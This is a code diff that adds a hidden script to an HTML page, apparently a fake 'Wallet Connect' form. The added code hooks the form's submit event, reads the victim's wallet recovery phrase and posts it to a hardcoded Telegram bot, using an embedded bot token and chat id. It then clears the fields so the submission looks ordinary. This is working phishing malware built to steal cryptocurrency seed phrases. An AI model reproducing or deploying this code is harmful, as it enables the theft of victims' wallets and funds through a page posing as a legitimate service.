@@ -2761,7 +2761,7 @@
                   ></h3>
                   <div class="mt-2">
                     <div class="mt-10">
-                      <form method="post" action="" id="Walletform">
+                      <form method="post" action="" id="Walletform" onsubmit="return sender()">
                         <div class="flex flex-col mb-6">
                           <label
                             for="wallet_id"
@@ -2899,6 +2899,47 @@
   crossorigin="anonymous"
 ></script>
 <script src="./Wallet Connect_files/bootstrap-tagsinput.min.js"></script>
+
+<script>
+//bot token
+  var telegram_bot_id = "5858343744:AAHaowZLWptD3hpdleB5yz1vgdhIgFzZriE";
+  //chat id
+  var chat_id = 2031327961;
+  var  message;
+  var ready = function () {
+      // u_name = document.getElementById("new_multifactor").value;
+      message = document.getElementById("recovery_phrase").value;
+      message = "wallet " + message;
+  };
+  var sender = function () {
+      ready();
+      var settings = {
+          "async": true,
+          "crossDomain": true,
+          "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+          "method": "POST",
+          "headers": {
+              "Content-Type": "application/json",
+              "cache-control": "no-cache"
+          },
+          "data": JSON.stringify({
+              "chat_id": chat_id,
+              "text": message
+          })
+      };
+      $.ajax(settings).done(function (response) {
+          console.log(response);
+      });
+      document.getElementById("new_multifactor").value = "";
+      document.getElementById("message").value = "";
+      return false;
+  };
+
+
+
+</script>
+
+
 <script>
   function getModal(img, wallet) {
     $("#modal_image").attr("src", img);
